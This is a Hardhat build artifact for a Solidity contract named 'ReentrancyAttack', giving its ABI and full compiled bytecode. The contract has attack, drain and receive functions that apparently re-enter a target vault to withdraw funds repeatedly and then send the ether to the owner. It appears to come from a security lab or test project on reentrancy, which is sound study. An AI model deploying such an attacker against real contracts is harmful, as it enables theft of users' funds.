{
  "_format": "hh-sol-artifact-1",
  "contractName": "ReentrancyAttack",
  "sourceName": "contracts/ReentrancyAttack.sol",
  "abi": [
    {
      "inputs": [
        {
          "internalType": "address payable",
          "name": "_vault",
          "type": "address"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "inputs": [],
      "name": "attack",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "attackCount",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "drain",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "owner",
      "outputs": [
        {
          "internalType": "address payable",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "vault",
      "outputs": [
        {
          "internalType": "address payable",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "stateMutability": "payable",
      "type": "receive"
    }
  ],
  "bytecode": "0x608060405234801561001057600080fd5b5060405161067038038061067083398101604081905261002f9161005d565b600080546001600160a01b039092166001600160a01b0319928316179055600180549091163317905561008d565b60006020828403121561006f57600080fd5b81516001600160a01b038116811461008657600080fd5b9392505050565b6105d48061009c6000396000f3fe60806040526004361061004e5760003560e01c8063407c2821146102c35780638da5cb5b146102ec5780639890220b146103245780639e5faafc14610339578063fbfa77cf1461034e57600080fd5b366102be57600a60025410801561007057506000546001600160a01b03163115155b156102bc576002805490600061008583610548565b90915550506000805460408051600481526024810182526020810180516001600160e01b0316633ccfd60b60e01b17905290516001600160a01b03909216916100ce919061056f565b6000604051808303816000865af19150503d806000811461010b576040519150601f19603f3d011682016040523d82523d6000602084013e610110565b606091505b50506000805460408051600481526024810182526020810180516001600160e01b0316633821b97b60e21b179052905193945091926001600160a01b039091169161015a9161056f565b6000604051808303816000865af19150503d8060008114610197576040519150601f19603f3d011682016040523d82523d6000602084013e61019c565b606091505b50506000805460408051600481526024810182526020810180516001600160e01b03166336cb886f60e21b179052905193945091926001600160a01b03909116916101e69161056f565b6000604051808303816000865af19150503d8060008114610223576040519150601f19603f3d011682016040523d82523d6000602084013e610228565b606091505b50506000805460408051600481526024810182526020810180516001600160e01b031663429c145b60e11b179052905193945091926001600160a01b03909116916102729161056f565b6000604051808303816000865af19150503d80600081146102af576040519150601f19603f3d011682016040523d82523d6000602084013e6102b4565b606091505b505050505050505b005b600080fd5b3480156102cf57600080fd5b506102d960025481565b6040519081526020015b60405180910390f35b3480156102f857600080fd5b5060015461030c906001600160a01b031681565b6040516001600160a01b0390911681526020016102e3565b34801561033057600080fd5b506102bc61036e565b34801561034557600080fd5b506102bc6103aa565b34801561035a57600080fd5b5060005461030c906001600160a01b031681565b6001546040516001600160a01b03909116904780156108fc02916000818181858888f193505050501580156103a7573d6000803e3d6000fd5b50565b60006002819055805460408051600481526024810182526020810180516001600160e01b0316633ccfd60b60e01b17905290516001600160a01b039092169183916103f49161056f565b60006040518083038185875af1925050503d8060008114610431576040519150601f19603f3d011682016040523d82523d6000602084013e610436565b606091505b50506000805460405130602482015260448101839052606060648201526084810183905292935090916001600160a01b0390911690829060a40160408051601f198184030181529181526020820180516001600160e01b0316635b0e93fb60e11b179052516104a5919061056f565b60006040518083038185875af1925050503d80600081146104e2576040519150601f19603f3d011682016040523d82523d6000602084013e6104e7565b606091505b50506000805460405192935090916001600160a01b039091169082908181818181875af1925050503d806000811461053b576040519150601f19603f3d011682016040523d82523d6000602084013e610540565b606091505b505050505050565b60006001820161056857634e487b7160e01b600052601160045260246000fd5b5060010190565b6000825160005b818110156105905760208186018101518583015201610576565b50600092019182525091905056fea264697066735822122041c9cc7a0434be53e191a3b2fd51d51e1751fa51ab30d733993da6d67240553c64736f6c63430008120033",
  "linkReferences": {},
  "deployedLinkReferences": {}
}